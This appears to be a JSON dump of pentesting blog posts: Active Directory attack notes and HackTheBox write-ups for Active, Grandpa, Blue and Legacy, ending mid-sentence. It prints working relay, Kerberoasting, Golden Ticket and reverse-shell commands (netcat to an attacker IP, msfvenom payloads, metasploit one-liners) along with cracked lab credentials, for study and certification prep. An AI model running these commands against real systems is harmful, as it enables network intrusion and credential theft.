[ { "title": "Attacking Active Directory", "url": "/posts/01-NotesActiveDirectory/", "categories": "Notes, Pentesting Notes", "tags": "ActiveDirectory, CVE-2021-1675, CVE-2020-1472, ZeroLogon, PrintNightmare, MS14-025, Ticket, Attacks, Kerberoasting, Bloodhound, PowerView, MITM6", "date": "2022-01-08 00:00:00 +0530", "snippet": "Attacking Active Directory: Initial Attack VectorsI am writing this for final preparation of OCSP.This article (notes) is gathered from PEH course by TCM academy and some blogs from internet.Links are at bottom of page.Do use Contents button on right side to easily navigate through topics.Netbios and LLMNR Name PoisoningExplanation LLMNR : Link Local Multicast Name Resolution. Basically DNS. It is used to identify hosts when DNS fails to do so. Previously NBT-NS. Key flaw is that the services utilize a user’s username and NTLMv2 hash when appropriately responded to.AttackAttack Condition : MITM and internal network.Attack Method Run responder Trigger / Wait for an event. Capture Hashes.responder.py -I tun0 -rdwThen crack these hashes with hashcat.Defence The best defense in this case is to disable LLMNR and NBT-NS To disable LLMNR, select “Turn OFF Multicast Name Resolution” under Local Computer Policy &amp;gt; Computer Configuration &amp;gt; Administrative Templates &amp;gt; Network &amp;gt; DNS Client in the Group Policy Editor. To disable NBT-NS, navigate to Network Connections &amp;gt; Network Adapter Properties &amp;gt; TCP/IPv4 Properties &amp;gt; Advanced tab &amp;gt; WINS tab and select “Disable NetBIOS over TCP/IP”.If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to : Require Network Access Control (with MAC Filters) Require strong user passwords. SMB Relay AttacksInstead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access.Attack Condition : SMB Signing must be in not required/disabled state on target. (from nmap we can get this) No packet/sign validation. Relayed user credentials must be admin on machine.Tools : Responder and disable SMB and HTTP from responder.conf file. So we can still listen but not respond through responder tool.Attack Method Run responder and then Run ntlmrelayx Trigger / Wait for an event. SAM hashes are captured and relayed. Windows SAM file = Linux Shadow File.responder.py -I tun0 -rdwntlmrelayx.py -tf targets.txt -smb2supportImmediately the hashes are relayed to a bunch of machines which was mentioned in targets.txt with ntlmrelayx command.Attack Shellntlmrelayx.py interactivesmb shellOther ways to abuse this feature are below.ntlmrelayx.py -tf targets.txt -smb2support -intlmrelayx.py -tf targets.txt -smb2support -e evil.exe # execute rev shellntlmrelayx.py -tf targets.txt -smb2support -c whoami # execute commandmsfconsole’s psexec module / psexec.py will give complete cmd shell.Sometimes it will require multiple attempts. Shares should be writeable.Also try smbexec.py and wmiexec.py.Defence Enable SMB Signing on all devices Pro : Completely stops the attack Con : Can cause performance issues with file copies. Disable NTLM authentication on network. Pro : Completely stops the attack Con : If Kerberos stops working, Windows defaults back to NTLM. Account tiering Pro : Limits domain admins to specific tasks. Con : Enforcing the policy may be difficult. Local admin restriction Pro : Can prevent a lot of lateral movement. Con : Potential increase in the amount of service desk tickets. MITM 6 / IPv6 Attack / DNS Takeover AttackMITM6 CheatSheet ReadExplanationmitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. The DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server.AttackAttack Condition : IPv4 is mostly used in systems. IPv6 may be turned on and may not being used. Nothing/Nobody is doing DNS for IPv6.Now, this will be leveraged. Attacker machine will spoof as DNS. All IPv6 traffic will be sent through this, causing victims to connect to ntlmrelayx for HTTP and SMB connections.We can get authentication to DC via LDAP or SMB. try chaining smbrelay + mitm6 or it’s default counterpart ntlmreayx.Tools : mitm6 - in python2 venv. pip3 breaks the installation.Attack Method Run mitm6 and then Run ntlmrelayx Reboot a machine in network. Now a lot of info will be dumped into a file by ntlmrelayx. When any administrator login into any machine in network the credentials will be relayed. A new user account will be created with admin privileges.Now it can be used to access DC.mitm6 -d marvel.localntlmrelayx -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootmemitm6 will start sending replies to all the DNS queries.After rebooting any one machine in network mitm6 will: start enumerating the relayed credentials. Checking the privileges. Domain info will be dumped into a file. (-l lootme)When an Administrator put password at login screen then attack will target ldap. set up an access control list. Create a new user. It can also add a computer in network. Check resource.Defence IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environment. If you don’t use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of allow prevents the attack from working (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPv6-In) (Inbound) Core Networking - Router Advertisement (ICMPv6-In) Outbound Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPv6-Out) If WPAD is not in use internally, disable it via Group Policy and by Disabling the WinHttpAutoProxySvc service. Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding. Consider Administrative users to the Protected Users Group or marking them as Account is sensitive and cannot be delegated which will prevent any impersonation of that user via delegation. Passback AttackSMB + Printer + Default Credentials + LDAP + ncat + ResponderThis case is rare.Read below blog for this.A Pen Tester’s Guide to Printer HackingPrinter has potential to get DC. Don’t underestimate this.Other Vectors &amp;amp; Strategies Begin day with mitm6 or responder. run scans to generate traffic. if scans are taking too long, look for websites in scope (http_version). Look for default credentials on web logins Printers Jenkins etc. Think outside the box. Like chain attack vectors. Enumerate and abuse features.Attacking Active Directory: Post-Compromise EnumerationThese tools will be used after compromising any machine in network with aim to get DC.PowerViewPowerView : PS tool to enumerate Domain Controller, Policy, Users, Groups etc.PowerView and do check PowerSploitEnumeration Methods# Load PowerViewpowershell -ep bypass. .\\PowerView.ps1# Get Domain infoGet-NetDomain# Get All DC Info | Most useful.Get-NetDomainController# Get Domain PolicyGet-DomainPolicy(Get-DomainPolicy).&quot;system access&quot;Get-NetUser # All user&#39;s detailed infoInvoke-ShareFinder # Find Interesting SharesPowerView Cheat SheetBloodhoundBloodhound : tool to visualize in a graph form what is going on domain in the network and where we can find the sensitive user and shortest path to get to domain admin. Sharphound : bloodhound Created in C#Get SharpHound.ps1 to Invoke-BloodHound function.And transfer it to compromised machine.# Load SharpHoundpowershell -ep bypass. .\\SharpHound.ps1# running the ingestorInvoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zipIt will collect all data to file.zip. Transfer it back to attacker machine for analysis in bloodhound.In attacker machine start neo4j and then bloodhound.And upload data. No need to unzip files.Attacking Active Directory: Post-Compromise AttacksThis requires some sort of credentials first cracked or hashed.Pass the Hash / PasswordIf we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks.updated crackmapexec has slightly different syntax. It may not match with below given screenshots as this was recorded before update of cme.Attack Methodscrackmapexec smb 10.10.10.99 -u sUser -d DOMAIN -p Password1crackmapexec smb 10.10.10.99 -u sUser -H sOmEntlmHash --local-auth# trying to dump SAM filecrackmapexec smb 10.10.10.99 -u sUser -d DOMAIN -p Password1For Example : Credentials here will be passed to entire subnet.crackmapexec | passthepassword attackcrackmapexec | passthehash attackwe can also use impacket tools like psexec.py for password / hash attacks.Dumping Hashes with secretsdump.pyIf we have atleast 1 set of credentials we can try to grab password hashes saved in cache.secretsdump.py marvel/fcastle:Password1@10.10.10.99DefenceHard to completely prevent, but we can make it more difficult on an attacker: Limit account re-use: avoid re-using local admin password. Disable Guest and Administrator accounts. Limit who is a local administrator (least privilege) Utilizing strong passwords The longer the better (&amp;gt;14 characters) avoid using common words. I like long sentences Privilege Access Management Check out/in sensitive accounts when needed. Automatically rotate passwords on check out and check in. Limits pass attacks as hash/password is strong and constantly rotated. Token ImpersonationExplanationTokens : Temporary keys that allow you access to a system/network without having to provide credentials each time you access af file. Think cookies for computers. Types : Delegate - Created for loggin into a machine or using Remote Desktop Impersonate - “non interactive” such as attacking a network drive or a domain logon script. AttackAttack Condition : MITM and internal network.Tools : Responder from Impacket.Attack Method Pop a shell and load Incognito. Impersonate our domain user.Note : We will be only able to impersonate any user only if they are logged in once.meterpreter&amp;gt; load incognitometerpreter&amp;gt; list_tokens -u ...a list of users...meterpreter&amp;gt; impersonated user MARVEL\\fcastleAttempt to dump hashes as non-Domain AdminInvoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;LSADump::LSA /inject&quot; exit&#39; -Computer HYDRA.marvel.localDefence Limit user/group token creation permissions. Account tiering. local admin restriction. KerberoastingShout-out to Mohit Panwar. Below notes are taken from his blog.Explanation When a user logs on to Active Directory, the user authenticates to the Domain Controller (DC) using the user’s password which of course the DC knows. The DC sends the user a Ticket Granting Ticket (TGT) Kerberos ticket. The TGT is presented to any DC to prove authentication for Kerberos service tickets. The user opens up Skype which causes the user’s workstation to lookup the Service Principal Name (SPN) for the user’s Exchange server. Once the SPN is identified, the computer communicates with a DC again and presents the user’s TGT as well as the SPN for the resource to which the user needs to communicate. The DC replies with the Ticket Granting Service (TGS) Kerberos service ticket. The user’s workstation presents the TGS to the Exchange server for access. Skype connects successfully.Kerberoasting in actionAttack MethodOnce you have admin/standard user access, look for the supported SPNs and get TGS ticket for the SPN using GetUserSPNs tool from Impacket.GetUserSPNs.py -request -dc-ip &amp;lt;DC_IP&amp;gt; &amp;lt;domain\\user&amp;gt;TGS ticket dump from Attacker’s PCNow once you have the TGS hash, all we need to do is to feed the hash to Hashcat tool to fetch Server’s user.Hashcat -m 13100 &amp;lt;hash_file&amp;gt; &amp;lt;rockyou wordlist&amp;gt;Important note: If any of the above test gives a negative result, keep an eye on your Wireshark traffic. Mostly setting up static DHCP or DNS or Gateway IP address solves such issues. This is a very small thing to underestimate which will affect the pentest in a peculiar way.Defence If possible use group managed service accounts which have random, complex passwords (&amp;gt;100 characters) and are managed automatically by Active Directory Ensure all service accounts (user accounts with Service Principal Names) have long, complex passwords greater than 25 characters, preferably 30 or more. This makes cracking these password far more difficult. Service Accounts with elevated AD permissions should be the focus on ensuring they have long, complex passwords. Ensure all Service Account passwords are changed regularly AS-REP RoastingThere is an option for an account to have the property “Do not require Kerberos pre-authentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.During pre-authentication, a user will enter their password which will be used to encrypt a timestamp and then the domain controller will attempt to decrypt it and validate that the right password was used and that it is not replaying a previous request.From there, the TGT will be issued for the user to use for future authentication. If pre-authentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline.Luckily, pre-authentication is required by default in Active Directory.Read More here.In my HackTheBox experience I have got Kerberos ticket without a valid credentials. We can use the script to output both the vulnerable usernames and their corresponding encrypted TGTs. RefGetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -requestThe Kerberos pre-authentication option has been disabled for the above user svc-alfresco and the KDC gave us back a TGT encrypted with the user’s password.GPP / cPassword Attacks / MS14-025ExplanationGroup Policy Preferences allowed admins to create policies using embedded credentials.These credentials were encrypted and they were placed in XML document and they were stored in variable &quot;cPassword&quot;. They key was accidentally released. Patched in MS14-025, but doesn’t prevent previous uses. Look for Groups.xml or any interesting in XML file. Most of the time these credentials are domain admin credentials and will allow us access to domain admin accounts.More info on this is here Group Policy PwnageRefer to Active machine walk-through in HackTheBox.Tools : gpp-decrypturl File AttackAfter compromising a user if User have access to any writeable file share. This can be utilized to capture more hashes via responder and possibly get credentials of any user with higher/different privileges. SCF Attack and url File attack uses same idea.Attack Method Run Responder on attacker machine. Then on target Create one shortcut file with below text block. While saving it save it as “All files”. Put it in File Share with catchy name. Wait for any other domain users to access that folder / file created.It will capture hashes.[InternetShortcut]URL=blahWorkingDirectory=blahIconFile=\\\\x.x.x.x\\%USERNAME%.iconIconIndex=1 where x.x.x.x = AttackerIPThis block of code is of Internet shortcut.Refer SCF and URL file attack against writeable share section on this repo.PrintNightmare (CVE-2021-1675)CVE-2021-1675 is a critical remote code execution and local privilege escalation vulnerability dubbed “PrintNightmare.” This remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Requires latest version of Impacket.Attack MethodsWe can use rpcdump.py from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable.And follow instructions from these two repos: cube0x0 RCE calebstewart LPEMimikatzIt’s now well known to extract plaintext passwords, hash, PIN code and kerberos tickets from memory.mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.MimikatzMimikatz BinariesDo check mimikatz wiki for info on other modules.Golden Ticket Attacks / Pass the TicketA Golden Ticket attack is when an attacker has complete and unrestricted access to an entire domain — all computers, files, folders, and most importantly, the access control system itself. Golden Ticket attacks can be carried out against Active Directory domains, where access control is implemented using Kerberos tickets issued to authenticated users by a Key Distribution Service. The attacker gains control over the domain’s Key Distribution Service account (KRBTGT account) by stealing its NTLM hash. This allows the attacker to generate Ticket Granting Tickets (TGTs) for any account in the Active Directory domain. With valid TGTs, the attacker can request access to any resource/system on its domain from the Ticket Granting Service (TGS).Attack Method capture sid of domain and NTLM Hash of Kerberos TGT account cmd&amp;gt; mimikatz.exemimikatz # privilege::debugmimikatz # lsadump::lsa /inject /name:krbtgt Now create Golden ticket. mimikatz # kerberos::golden /User:real_or_fake_user /domain:marvel.local /sid:sid_of_domain /krbtgt:NTLM_Hash /id:500 /ptt Note : RID 500 = Administrator and ptt = pass the ticket And finally pop a shell. mimikatz # misc::cmd For sid and NTLM hashgolden ticketpoping shell after golden ticket After this point we can use psexec.exe and gain access to this machine. Golden ticket can also help us to create persistent.ZeroLogonExplanation Zerologon is a vulnerability in the cryptography of Microsoft’s Netlogon process/Netlogon Remote Protocol (MS-NRPC) that allows an attack against Microsoft Active Directory domain controllers. Zerologon makes it possible for a hacker to impersonate any computer, including the root domain controller.It allows users to log on to servers that are using NT LAN Manager (NTLM).This is complex attack. It will set Domain Controller authentication to null. After running this attack if we do not restore the password we will break DC. Use this repo for attack : dirkjanm CVE-2020-1472Note : Requires the latest impacket from GitHub with added netlogon structures. And Only works on Python 3.6 and newer!Good reads are below What is ZeroLogon? dirkjanm CVE-2020-1472 SecuraBV ZeroLogon CheckerRelatedBlogsDo checkout these awesome blogs/articles. These were referred many times in PEH course. These can be really useful.Top Five Ways I Got Domain AdminMore on mitm6Combining NTLM Relays and Kerberos DelegationA Pen Tester’s Guide to Printer Hacking" }, { "title": "Active Writeup", "url": "/posts/04-Active/", "categories": "Writeup, HackTheBox", "tags": "hackthebox, OSCP, WriteUp, TJNULLsList, Kerberoasting, ActiveDirectory, Windows2008, Windows, impacket, DC, DomainController, hashcat", "date": "2022-01-05 00:00:00 +0530", "snippet": " In this writeup I have pwned Active from hackthebox. This was Active Directory Box pwned using some impacket tools. Good starter box for learning AD hacking.Enumerationrustscanrustscan --accessible --ulimit 5000 -a 10.129.210.13 -- -p- | tee 0_rust.logrustscan resultsnmapsudo nmap -sC -sV -O -oN 1_initial 10.129.210.13nmap scan results 1nmap -A -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49153,49155,49152,49154,49157,49173,49165,49170,49158 10.129.210.13 -oN 2_PortsScannmap scan results 2I ran default nmap scan and nmap with ports scan after getting results from rustscan.Both gave a slightly different results.OS : Windows Server 2008 R2 SP1Host : DC (Domain Controller)Port 53: running DNS 6.1.7601Port 88,464 : Kerberos ServicePort 139,445 : SMBPort 389 : Active Directory LDAPPort 47001,49157 : HTTPPorts 135,5722,49152,49153,49154,49155,49158,49165,49170,49173 : msrpcSome ports are protected by tcpwrapper. So they are appearing as filtered. I referred some other write-ups of this box many of them got service info on MSRPC ports. Weird.Going forward.. Enumerating most interesting ports first.wget | WebPort 47001,49157 were running HTTP. Nothing.It was False +ve.wget web resultssmbmap | SMBIn SMB Message signing is enabled and required.Only one share Replication is readable.Enumerating shares using crackmapexec.crackmapexec smb 10.129.210.13 -u &#39;&#39; -p &#39;&#39; --sharescrackmapexec SMB enumReading and getting files using smbclient.smbclient //10.129.210.13/Replication -Ncd &quot;\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\&quot;get Groups.xmlGroups.xml is only useful file found in SMB share. Groups.xml file is a AD Group Policy Preference (GPP) file.userName=&quot;active.htb\\SVC_TGS&quot;cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; GPP was introduced with the release of Windows Server 2008 and it allowed for the configuration of domain-joined computers.It was encrypted with AES and it’s public key was available.This can be cracked with gpp-decrypt tool.gpp-decrypt &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;#output : GPPstillStandingStrong2k18gpp-decrypt password Cracking Now we have username and password.active.htb\\SVC_TGS:GPPstillStandingStrong2k18Failed ExploitationWith the above user credentials. We cannot get shell as none of SMB shares are writeable.psexec.py SVC_TGS:&#39;GPPstillStandingStrong2k18&#39;@10.129.210.13psexec shell failedBut some files are readable with these credentials. It is entire file file system.Critical / High Level User’s folder are not accessible.smb file accessKerberoastingWith the credentials we can enumerate users on this domain using impacket’s GetUserSPNs.py.GetUserSPNs.py -request -dc-ip 10.129.210.13 active.htb/SVC_TGS -save -outputfile GetUserSPN.logGetUserSPNs.pyAfter running this we have got Kerberos ticket in mentioned output file GetUserSPN.log. I have used hashcat 6 for it’s auto-detection of hash feature.$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$d899df4abe91d5a873d55e0638c65e60$a6a30280a9158ae79fd002f6bf37aa01cce2acdf14336a6478fa442ab797ae2eb15bf2a65b03ab8b6ff66d60738be8280a155e02f0f27bcbf0682c4a8c819defdbbdc7dc10c4a633b88837a758c835ddd29ce0b3b1cb1ebf458a320739205b5fcda42e9fc489db68eb421fd2452de74167119aadeec3c37e9c33bdfb9b8e836747425b7e6cd9e59ea0132184ed0b373a8b1bdb45bb15cd14fcfb5f913558ff6f75dd7690c469e54bf88f36abb3c4099a432dedfe6b01832b26a8eda0b88968d1225c89a44f04d2c8b7ac089aaf2b5e0b58a2ba083b0fb21d21fb9fc37b717df4df6bdcfe850d9816cac7ed346a8b627b990dc7c938c3f80cd883e2a6fc6368d61db4b325dc443590a582223f3d3057f58321542f0d66dc07a43f6d683c45a41a93ff5173d3fd94c1e1152adac096889c5a344ba102e322055ef6366f41fc41c02b9fc45e2f33683691c30e280019ac3f5fbb278a416ac125244b46660e54ad0967b4be6bc4bf7279600d5c74a1686b30bccce9ea0d635d0ae0a1880ab55c01fab96c8f38c5b7ba1b2957634f2dc8f9bed872da301f58dfefc0ed5dbe46e9b3e660b3d8f85ee5c2bd9150787a1bc72b84df76ead79f822319a45a580002447cc6a781b67a8f9a295bf42d84e7958f09eb8439c3dacd7840a48844f58dc2045c2390f5628ec278b15180bc465702f2503e983998ed9c05603bc8c3b4465647c1af07dc9f2132abac552d6c7006639656ac8e58109b2ef7eae6a9b42f04e189bc45cc3ae0b4affe100c37ac38ab239e4e2c74351826e3bc91d794411ac6dc15784f0d664a9ea9ad8cfb5af246a6eef87769998701815b2ce2f4765bab2542dfbc1af6035a300b5a60018feab88c19f50bc340af6161721bc035b0a3a42b09869eb04a252af60dbcd8a5100bae562c78e972fb8f17d96fd62acedbd601297282cd78d15aefd7f6c87cce7716c0c93db5a641e13aacba15725b5e0fcbc0b8e5c8576724337b806bf572f2c83607e5465ad2dd5e2194b9233185fb9b27fd34cd0eccbbe88a928d25eec87903b7490ab9da520e26abb698ef2850d8279b30a534e772839811d99d8b3d52cdf837bc2d89fbdc337a23b5e48c00389ea7de8b798c6dd8095ca491f9f4b6c757137ed35f00c174a9c14378ca9cd1ced6bf05ab6f72d51a57d42327b1f3b1460e5d62729b32f371ff95a0bbaa1f5c35e264e9d89e2522d220616d99d31993352cbb276cdbe67f8ffc7d59d1b5494b1c9ece4fKerberos ticketOn cracking Kerberos ticket with Hashcat 6 we got password for Administrator : Ticketmaster1968.\\hashcat.exe --quiet .\\QHASH.txt .\\rockyou.txtExploitationWe can use impacket’s psexec.py to get a shell with Administer password we just cracked.psexec.py Administrator:&#39;Ticketmaster1968&#39;@10.129.210.13psexec Admin shellAnd we get a shell with highest privilege.Recommendation Upgrade to latest Windows Server. Updating all patches will not be enough. Don’t put AD/DC policy files in SMB File shares. Harden Kerberoasting service.systeminfoFailures and Learnings This is one of simple Active Directory box on HTB. Being out of practice or having no knowledge of Active Directory pentesting will make this box difficult. I referred a few write-ups for understanding this box and getting hints for exploitation. In AD boxes many ports will be open with complex SMB File shares. I got Groups.xml in SMB share deep in folders. Enumerate everything.Checkout following good reads. GPP Passwords Privilege Escalation via Group Policy Preferences (GPP) GPP AES Password Encryption SANS Kerberoasting" }, { "title": "Grandpa Writeup", "url": "/posts/03_Grandpa/", "categories": "Writeup, HackTheBox", "tags": "hackthebox, OSCP, WriteUp, Windows, Windows2003, WebDAV, TJNULLsList, MS14-058, MS14-070", "date": "2021-12-31 00:00:00 +0530", "snippet": " In this writeup I have pwned Grandpa from hackthebox with manual exploit and metasploit exploit. Target was vulnerable with CVE-2017-7269.Enumerationrustscanrustscan --accessible --ulimit 5000 -a 10.129.179.235 -- -p-rustscan resultsnmapsudo nmap -Pn -oN grandpa -A -O -p 80 10.129.179.235nmap resultsdavtest | webdavtest --url http://10.129.179.235/davtest resultsgobuster | webgobuster dir -u http://10.129.179.235/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txtgobuster resultsTarget running OS : Microsoft Windows 2003Microsoft-IIS/6.0 with extension of WebDAV. Almost all the http methods are allowed. There was no write permissions on target web root directory. Gobuster didn’t gave anything useful. It just gave authenticated redirection.ExploitationTarget is vulnerable to CVE-2017-7269.For exploitation we can use exploit code from this repository.Set-up ncat listener and run the exploit like below.rlwrap nc -lvnp 1337# python exploit.py &amp;lt;target_ip&amp;gt; &amp;lt;port&amp;gt; &amp;lt;attacker_ip&amp;gt; &amp;lt;port&amp;gt;python exploit.py 10.129.179.235 80 10.10.17.81 1337user shellAnd we get a shell with network account privilege.Post ExploitationOn checking current user privileges we got confirmation we can impersonate privileges.whoami /privwhoami /privAs Token Impersonation is enabled and target is Microsoft Windows 2003. Priv Esc is possible withChurrasco. certutil was not working properly so binary transfer was done using smbserver.sudo smbserver.py a bins # at binary locationfile transferChurrasco also requires ncat. So it had to be transferred too.Before execution nc listener is required at attacker machine end.rlwrap nc -lvnp 9001 # attacker machinechurrasco.exe -d &quot;.\\nc.exe -e cmd.exe 10.10.17.81 9001&quot; # victim machineAnd we get a shell with highest privilege.churrasco priv escExploitation | MetasploitWith previous enumeration we confirmed target was vulnerable with CVE-2017-7269. Searchsploit didn’t gave results. So on searching CVE in msfconsole we got 1 exploit.msf6 &amp;gt; search 2017-7269exploit/windows/iis/iis_webdav_scstoragepathfromurlsearching exploitWith below one liner we can exploit target with Metasploit module and get meterpreter shell.msfconsole -q -x &quot;use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; set RHOSTS 10.129.180.7; run;&quot;meterpreter user shellPost Exploitation | Metasploitgetuid failed as we got shell with unstable process. We have migrate this to another stable process for further exploitation.meterpreter &amp;gt; getuid[-] 1055: Operation failed: Access is denied.meterpreter &amp;gt; ps ...meterpreter &amp;gt; migrate 1924After migration now we have stable meterpreter shell with network account privilege.process migrationFor priv esc we can use local_exploit_suggesterlocal exploit suggesterIt gave multiple results. Selecting 2nd from top as 1st exploit could not be validated.Using windows/local/ms14_058_track_popup_menuMS14-058 priv escgetuid and ps didn’t worked first time. After running shell and after going back to meterpreter it gave expected response.And finally we get a shell with highest privilege.MS14-058 priv escPriv esc was also successful on trying another exploit windows/local/ms14_070_tcpip_ioctlMS14-070 priv escIt gave stable shell with highest privilege.Collecting all hashes after final compromise.meterpreter &amp;gt; hashdumpAdministrator:500:0a70918d669baeb307012642393148ab:34dec8a1db14cdde2a21967c3c997548:::ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Harry:1008:93c50499355883d1441208923e8628e6:031f5563e0ac4ba538e8ea325479740d:::IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::Failures and Learningssearchsploit &quot;Microsoft IIS 6.0&quot;searchsploit -m &quot;windows/remote/41738.py&quot;Tried to use Microsoft IIS 6.0 - WebDAV &#39;ScStoragePathFromUrl&#39; Remote Buffer Overflow | windows/remote/41738.py as this seemed reliable for moment. But it didn’t worked.41738 failedUsing explodingcanIt didn’t worked for nc shell. It worked for developer with meterpreter shell but I wanted to avoid meterpreter.explodingcan resultsFinally I used this repo and it worked.Even it had 48 stars in github which seems unreliable for this vulnerability.meterpreter’s getsystem will not always work even if SeImpersonatePrivilege is set to true.getsystem failed" }, { "title": "Blue Writeup", "url": "/posts/02-Blue/", "categories": "Writeup, HackTheBox", "tags": "hackthebox, OSCP, WriteUp, Windows, Windows7, eternalblue, MS17-010, TJNULLsList", "date": "2021-12-29 00:00:00 +0530", "snippet": " In this writeup I have pwned Legacy from hackthebox with Eternal blue exploit. Using manual and metasploit exploit.Enumerationrustscanrustscan --accessible -a 10.129.179.6 -- -Pn -p-rustscan resultsnmapnmap -T4 -Pn -A -p 135,139,445,49152,49153,49154,49155,49156,49157 10.129.179.6nmap resultsnmap -Pn -A --script=smb-vuln* -p 139,445 10.129.179.6 | tee nmap-vulns.lognmap vulnerablity scan resultsTarget running OS : Windows 7 Professional 7601 Service Pack 1 SMB Service with disabled message signing.This can lead to exploitation using eternal blue exploit on outdated OS with vulnerable state of service.nmap vulnerablity script scan gave confirmation target is vulnerable to CVE-2017-0143 : Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)smbclientsmbclient -q -NL 10.129.179.6 # Shares Listsmbclient -N \\\\\\\\10.129.179.6\\\\Users # readable smbclient gave a list of shares. Only share Users is readable. None of them are writeable. Admin shares are not accessible.smbclient enumerationExploitationMS17-010For exploiting the target using MS17-010 we can use the following exploit from github. MS17-010git clone https://github.com/helviojunior/MS17-010.gitcd MS17-010/python checker.py 10.129.179.6 From this repository checker.py script uses null authentication to check vulnerability. Directly running it will fail the check in this case. ‘guest’ authentication is used in nmap / smbclient and shares were accessible.After changing username on line 14 of checker.py it will give named pipes and confirm target is vulnerable to eternalblue.checker.py update and checkUpdate username on line 37 of send_and_execute.py so exploit can work.This exploit requires malicious executable to get a reverse shell. We will create it using following commands in the same location of exploit.msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe &amp;gt; eternalblue.exeupdating send-and-execute.py and msfvenomAnd run the exploit after setting up ncat listener.rlwrap nc -lvnp 1337# python send_and_execute.py TARGET_IP eternalblue.exepython send_and_execute.py 10.129.179.6 eternalblue.exeAnd finally we get a shell with highest privileges.system shellMetasploit | MS17-010With below one liner we can exploit target with Metasploit MS17-010 module and get meterpreter shell.msfconsole -q -x &quot;use exploit/windows/smb/ms17_010_psexec; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; set RHOSTS 10.129.179.6; run;&quot;meterpreter shellPost ExploitationThis system was compromised with highest privilege.Transferred and executed mimikatz.No hashes were saved in system.hashdump attempt / mimikatzRecommendationSMB was enabled on outdated un-supported Windows 7 and SMB message signing was disabled. Update to latest supported version of Windows. Advise not to run SMB service with disabled message signing as Administrator.Key LearningIn this pentest, with easiest enumeration we got to know target is vulnerable to eternal blue. And there are a lot of exploits available for this on github and other resources.SMB service was using guest authentication. We modified vulnerability scanner and exploit with guest as credentials to work." }, { "title": "Legacy Writeup", "url": "/posts/01-Legacy/", "categories": "Writeup, HackTheBox", "tags": "hackthebox, OSCP, WriteUp, Windows, windowsxp, eternalblue, MS08-067, MS17-010, TJNULLsList", "date": "2021-12-27 00:00:00 +0530", "snippet": " In this writeup I have pwned Legacy from hackthebox in all possible ways using manual exploits and metasploit.Enumerationrustscanrustscan --accessible -a 10.129.178.214 -- -Pn -p-rustscan resultsnmapsudo nmap -Pn -A -O -p 139,445 10.129.178.214 | tee nmap.lognmap resultssudo nmap -Pn --script=smb-vuln* -p 139,445 10.129.178.214 | tee nmap-vulns.lognmap vulnerablity scan resultsTarget is running OS : Windows XP SP2 or Later. SMB Service with disabled message signing.This can lead to exploitation using eternal blue exploit on outdated OS with vulnerable state of service.nmap vulnerablity script scan gave confirmation target is vulnerable to CVE-2008-4250 : Microsoft Windows system vulnerable to remote code execution (MS08-067) CVE-2017-0143 : Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)smbclientsmbclient -NL 10.129.178.214smbmap -H 10.129.178.214smbmap and smbclient confirmed no shares are accessible.ExploitationMS08-067For exploiting the target using MS08-067 we can use the following exploit from github. MS08-067wget &quot;https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py&quot;This exploit have dependencies of python library pycryptodomex / pycryptodome which was previously known as pycrypto.Installing impacket in python virtual environment will fulfill the minimum requirement to execute exploit.virtualenv -p /usr/bin/python venvsource venv/bin/activategit clone https://github.com/SecureAuthCorp/impacket.gitcd impacketpip install .# cd back to exploit location.Now we can test if exploit is usable using simple run.python ms08-067.pyThis will give usage example to run this exploit.This exploit also requires shellcode to get a reverse shell. We can generate 